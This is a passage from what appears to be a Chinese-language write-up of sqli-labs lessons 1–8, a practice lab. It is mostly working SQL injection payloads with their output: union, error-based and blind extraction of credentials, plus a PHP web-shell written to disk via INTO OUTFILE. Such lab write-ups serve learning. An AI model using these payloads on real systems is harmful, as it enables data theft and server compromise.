class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1</span><br></pre></td></tr></table></figure>\n<p>哦豁，有数据回显</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>用 orderby 试一下要几个字段，但是发现随便 oderby 都是一样的回显…</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=2 order by 110</span><br></pre></td></tr></table></figure>\n<p>中间试了好多都没有给回应，加单引号报错看一下 sql 语句，先入为主以为是数字型的了，明明题目也写了… 蠢爆了！！！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27;</span><br><span class=\"line\">输出：</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>orderby 试出来是要三个字段，因为要闭合后面的单引号好麻烦就直接用 #（URL 编码 %23）注释了后面的代码，自己搞</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27; order by 3 limit 1 %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&#x27; order by 4 limit 1 %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<p>三个字段，只输出了两个值，理所当然有一个 id 啦，所以第一个字段随便搞，后面两个字段用了输出我们要的数据，一套流程走</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，从mysql默认的数据库information_schema里找所有的数据，使用group_concat拼接：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,database(),group_concat(schema_name) from information_schema.schemata %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">第二个字段是当前数据库security，第三个字段是输出localhost所有的数据库</span><br><span class=\"line\"></span><br><span class=\"line\">爆表：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br><span class=\"line\">爆字段：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br><span class=\"line\">爆字段值：</span><br><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=666666&#x27; union select 1,group_concat(concat_ws(&#x27;--&#x27;,id,username,password)),3 from users+%23</span><br><span class=\"line\">输出：</span><br><span class=\"line\">Your Login name:1--Dumb--Dumb,2--Angelina--I-kill-you,3--Dummy--p@ssword,4--secure--crappy,5--stupid--stupidity,6--superman--genious,7--batman--mob!le,8--admin--admin,9--admin1--admin1,10--admin2--admin2,11--admin3--admin3,12--dhakkan--dumbo,14--admin4--admin4</span><br><span class=\"line\">Your Password:3</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<ol>\n<li>虽然我觉得闭合引号很麻烦，但是我就是还是想去试一下，直接在最后闭合就可以了，也不会报语法错</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/</span><br><span class=\"line\">?id=1&quot; order by 3 &quot;</span><br></pre></td></tr></table></figure>\n<p>​\t\t那为什么大家闭合的时候都喜欢用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>\n<p>画面感地理解一下函数</p>\n<p>concat_ws () 是拼接一行的数据</p>\n<p>group_concat () 是拼接一列的数据</p>\n</li>\n<li>\n<p>因为 sql 学的就很菜，有些语法函数什么的还要百度，mysql 里 information_schema 里的，很多表名和字段名经常搞混，手工注入的时候还要去看具体的表名和字段名，超级浪费时间的，可是记一下吧很久不写又忘记了，而且数据库那么多，默认的表都不一样，还是多写题 8</p>\n</li>\n<li>\n<p>跑 sqlmap 的时候，会给出相应的 payload，有些写得真的超级复杂，说是为了绕过把，可是有个 select 就感觉绕不过去呀，等有一天我不再是一个连脚本都不会用的菜鸡了，有机会的话，想去研读一下源码</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-2\"><a class=\"markdownIt-Anchor\" href=\"#less-2\">#</a> Less-2</h1>\n<p>data: 2020-11-17 10:32:43</p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h2>\n<p>和 less-1 相比就是少闭合了两个引号罢了</p>\n<h3 id=\"sqlmap-2\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-2\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-2\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-2\">#</a> 手工注入</h3>\n<p>判断 id 是注入点且需要三个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:http://www.sqli-labs.com/Less-2?id=1 order by 4输出：Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;payload:http://www.sqli-labs.com/Less-2?id=1 order by 3输出：Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>和 less-1 一样一套流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata爆当前数据库的表：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema爆字段：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;爆字段值：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结</h2>\n<p>想当年我还是个不管写什么题目都要看通关手册的人，鼓掌！！！</p>\n<hr>\n<h1 id=\"less-3\"><a class=\"markdownIt-Anchor\" href=\"#less-3\">#</a> Less-3</h1>\n<p>date:2020-11-17 11:00:04</p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h2>\n<h3 id=\"sqlmap-3\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-3\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-3\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-3\">#</a> 手工注入</h3>\n<p>加单引号报错，看后面具体要闭合啥</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-3?id=1asdf&#x27;kkkk</span><br></pre></td></tr></table></figure>\n<p>输出，发现后面有括号啥的闭合一下，并且 id 也是字符型的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;kkkk&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据 order by 判断需要的字段数是 3 个</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 4 --+http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure>\n<p>脱脱脱：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+爆字段值：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p>?id=1&quot; 竟然正常返回信息了！！！</p>\n<p>因为 id=xx (‘1&quot;’) 了啊，根本没闭合啊，有点弱智哦</p>\n<hr>\n<h1 id=\"less-4\"><a class=\"markdownIt-Anchor\" href=\"#less-4\">#</a> Less-4</h1>\n<p>date:2020-11-17 11:25:45</p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h2>\n<h3 id=\"sqlmap-4\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-4\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-4\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-4\">#</a> 手工注入</h3>\n<p>发现双引号报错，所以可以直接在后面加 &quot;) %23+ 进行闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-4?id=1&quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>根据 order by 确定是三个字段后，union select 拿数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+爆字段值：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结</h2>\n<p>没啥好说的</p>\n<hr>\n<h1 id=\"less-5\"><a class=\"markdownIt-Anchor\" href=\"#less-5\">#</a> Less-5</h1>\n<p>date:2020-11-17 11:48:40</p>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h2>\n<h3 id=\"sqlmap-5\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-5\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-5\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-5\">#</a> 手工注入</h3>\n<p>单引号报错，payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>‘‘1’’ LIMIT 0,1’第一个单引号真的巨坑，总是眼糊看错成 SQL 语句里面的</p>\n<p>闭合单引号，用 order by 确定是提取了三个字段，但是页面上并没有输出字段的值，目测是后台进行了判断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27; order by 3 +%23+输出：You are in...........</span><br></pre></td></tr></table></figure>\n<p>前端没有发现啥有用的东西，撸了一下 floor 报错，开干</p>\n<p>爆库 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-5?id=1&#x27; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>\n<p>然后像以前一样的流程，在 concat 里面找自己要的数据就好了</p>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结</h2>\n<ol>\n<li>\n<p><a href=\"https://www.cnblogs.com/litlife/p/8472323.html\">select count (*) from test group by floor (rand (0)*2) 报错原理 666</a></p>\n<p>概括一下:</p>\n<p>floor (rand (0)*2) 是随机 0、1，但是是伪随机 011011…</p>\n<p>count (*) 与 group by 共同工作时会建立一张虚拟表，两个字段 (关键字和数量)</p>\n<p>floor 表达式第一次运算的值为 0，在表中没有找到 key 为 0 的数据，故插入，在插入的过程中需要再取一次 group by 后面的值（即再进行一次 floor 运算，结果为 1），取到了 1，将之插入，并将 count (*) 置 1。</p>\n<p>也就是说一次插入要调用两次 floor，所以在后面碰见 01 时，0 没有，插入 1，但是 1 已经存在，报错</p>\n</li>\n<li>\n<p>payload 是 sqlmap 复制后修改的，自己手动输入的总是说有语法错，我对着看了好多遍感觉没有什么问题啊，无理取闹，后来看报错应该是 and 后面的 select from 的表要别名 (Every derived table must have its own alias)，select from 外面还要加一个括号</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-6\"><a class=\"markdownIt-Anchor\" href=\"#less-6\">#</a> Less-6</h1>\n<p>data: 2020-11-17 15:50:40</p>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h2>\n<h3 id=\"sqlmap-6\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-6\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<h3 id=\"手工注入-6\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-6\">#</a> 手工注入</h3>\n<p>输入了 less-5 里面的 payload，发现不报错了！</p>\n<p>机智的我去看 sqlmap 发现就是变成了闭合双引号罢了唉，人傻了</p>\n<p>爆当前库 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-6?id=1&quot; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&quot;1</span><br></pre></td></tr></table></figure>\n<p>CONCAT (payload,floor (rand (0)*2)) 作为 group by 的 key</p>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结</h2>\n<p>没啥好总结的，还以为又有新东西可以看了</p>\n<hr>\n<h1 id=\"less-7\"><a class=\"markdownIt-Anchor\" href=\"#less-7\">#</a> Less-7</h1>\n<p>date:2020-11-17 16:09:39</p>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h2>\n<h3 id=\"sqlmap-7\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-7\">#</a> sqlmap</h3>\n<p>同 Less-1</p>\n<p>sqlmap 用的时间盲注，它自己跑着跑着连接就断了，笑死</p>\n<h3 id=\"手工注入-7\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-7\">#</a> 手工注入</h3>\n<p>试了一些，目测后台做了判断</p>\n<p>sql 报错统一输出：</p>\n<p>You have an error in your SQL syntax</p>\n<p>正常输出：You are in… Use outfile…</p>\n<p>盲注的话，二分法判断字符的 ascii 码值，sqlmap 都说它扛不住了</p>\n<p>看见正常输出那里有个 use outfile…，感觉是个提示，新东西就要百度看看，好叭这里直接看通关秘籍了，竟然直接写入文件 getshell 了…</p>\n<p>太帅了，动手撸一遍</p>\n<p>要上传一句话连接的话，需要知道路径，去有回显的题拿路径啦</p>\n<p>basedir 参数指定了安装 MySQL 的安装路径</p>\n<p>datadir 参数指定了 MySQL 的数据库文件放在什么路径下</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-1/?id=-1&#x27; union select 1,@@datadir,@@basedir MYSQL %23+</span><br></pre></td></tr></table></figure>\n<p>输出，并没有 phpstudy 的路径，因为我根本没用 phpstudy 的数据库…：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Your Login name:C:\\ProgramData\\MySQL\\MySQL Server 5.5\\Data\\Your Password:C:/Program Files (x86)/MySQL/MySQL Server 5.5/</span><br></pre></td></tr></table></figure>\n<p>尝试在获取到的路径下存入 php 一句话：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7/?id=1 union select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/ProgramData/MySQL/MySQL Server 5.5/Data/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>但是一直报错，愤怒地直接去 mysql 运行的时候，发现报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[SQL] select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/haha.php&#x27;[Err] 1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>\n<p>去查了一下报错原因：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将桌面文件存储到mysql时报错：The MySQL server is running with the --secure-file-pri option so it cannot execute this.</span><br><span class=\"line\">报错原因：mysql文件的导入和导出路径有默认的设置，即 secure-file-priv,当传入的csv文件路径与默认的路径冲突时就会报错。</span><br><span class=\"line\">secure-file-priv的值有三种情况：secure_file_prive=null ––限制mysqld 不允许导入导出</span><br><span class=\"line\">secure_file_priv=/path/ – --限制mysqld的导入导出只能发生在默认的/path/目录下</span><br><span class=\"line\">secure_file_priv=’’ – --不对mysqld 的导入 导出做限制</span><br></pre></td></tr></table></figure>\n<p>通过命令  <code>select @@secure_file_priv</code>  查询，发现 secure_file_priv 的值为 null，也就是说不允许导入导出</p>\n<p>于是到 mysql 的安装目录下修改 my.ini 配置文件，在 mysqld 节点下加入 secure_file_priv=’’，对导入导出不进行限制</p>\n<p>在尝试 payload 时，</p>\n<p>?id=1 order by 111111 %23 + 不报错</p>\n<p>?id=1’ order by 111111 %23 + 报错</p>\n<p>?id=1&quot; order by 111111 %23 + 不报错</p>\n<p>说明有一个单引号要闭合</p>\n<p>?id=1’ order by 1 %23 + 报错</p>\n<p>?id=1’)) order by 3 %23 + 不报错</p>\n<p>?id=1’)) order by 4 %23 + 报错</p>\n<p>闭合成功，且需要三个字段</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select &#x27;&lt;?php @eval($_POST[&quot;haha&quot;]); ?&gt;&#x27;,2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>虽然输出还是报错，但是文件已经上传到 D 盘了（因为这个 sql 语句我已经在数据库试了很多遍了…）</p>\n<p>但是因为我的 mysql 不是 PHPstudy 的，所以没有搞到 phpstudy 的路径，没有上传到 phpstudy 目录下，也连接不上解析不了？</p>\n<p>机智的我决定手动复制到 www 下</p>\n<p>上蚁剑连接成功</p>\n<p>另外要看数据库数据的话可以通过改上面的 p 输出文件，然后上蚁剑查看输出的文件内容，其余的爆数据库和之前的题目都一样的流程，例如爆当前数据库名：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select database(),2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>\n<p>因为用命令行登录数据库需要密码</p>\n<h3 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结</h3>\n<ol>\n<li>\n<p>MySQL 的 @与 @@区别</p>\n<p>@x 是 用户自定义的变量 (User variables are written as @var_name)</p>\n<p>@@x 是 global 或 session 变量 (@@global @@session)</p>\n</li>\n<li>\n<p>菜鸡的悲哀就是做个题还要靠作弊（菜菜子不要难过！你会变强的！）</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"less-8\"><a class=\"markdownIt-Anchor\" href=\"#less-8\">#</a> Less-8</h1>\n<p>date:2020-11-21 13:58:47</p>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h2>\n<h3 id=\"sqlmap-8\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-8\">#</a> sqlmap</h3>\n<p>同 less-1，看见 sqlmap 的 payload，它也是盲注咯</p>\n<h3 id=\"手工注入-8\"><a class=\"markdownIt-Anchor\" href=\"#手工注入-8\">#</a> 手工注入</h3>\n<p>单引号闭合后分别 order by 3 和 4，发现一个正常输出一个不输出，说明单引号闭合成功，order by 执行成功，且需要三个字段，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-8?id=1&#x27; order by 3 %23+http://www.sqli-labs.com/Less-8?id=1&#x27; order by 4 %23+</span><br></pre></td></tr></table></figure>\n<p>没有回显数据，只能盲注</p>\n<p>尝试第七关的 outfile 上传文件，上传成功，上蚁剑连接</p>\n<p>换个思路，上盲注，看题目是布尔盲注，一个一个猜呗，机智的我决定先测试出长度再上 bp 爆</p>\n<p>length () 函数，显而易见是返回里面参数的长度</p>\n<p>substr (a,b,c) 函数，显而易见是截断字符串 a，b 位置开始截取 c 个字符</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.sqli-labs.com/Less-8?id=1&#x27; and (select length(database()))=8 %23+</span><br></pre></td></tr></table></figure>\n<p>=8 时正常输出，说明当前数据库名字长度为 8</p>\n<p>上 bp, 选中 Intruder</p>\n<p>攻击模式可以选 sniper 也可以选 clusterbomb，都很方便，字典直接用 excel 下拉到 127 的…，一个一个打也太费劲了把</p>\n<p>从 1 到 127 一个一个猜数据库名中的字符，根据返回数据的长度不同找到正确的 ascii 码值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Less-8/?id=1%27%20and%20(select%20ascii(substr(database(),§1§,1)))=§115§%20%23+ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>\n<p>这里就不上 bp 图了，不好搞，用的笛卡尔乘积，发了一千多个请求就爆了个当前数据库名，要爆别的在上面 payload 改改完事：</p>\n<table>\n<thead>\n<tr>\n<th>request</th>\n<th>payload1</th>\n<th>payload2</th>\n<th>status</th>\n<th>timeout</th>\n<th>error</th>\n<th>length</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td></td>\n<td></td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>787</td>\n<td>3</td>\n<td>99</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>802</td>\n<td>2</td>\n<td>101</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>838</td>\n<td>6</td>\n<td>105</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>909</td>\n<td>5</td>\n<td>114</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>913</td>\n<td>1</td>\n<td>115</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>927</td>\n<td>7</td>\n<td>116</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>932</td>\n<td>4</td>\n<td>117</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>968</td>\n<td>8</td>\n<td>121</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>950</td>\n<td></td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>1</td>\n<td>200</td>\n<td>false</td>\n<td>false</td>\n<td>966</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>3</td>\n<td>1</td>\n<td>200</td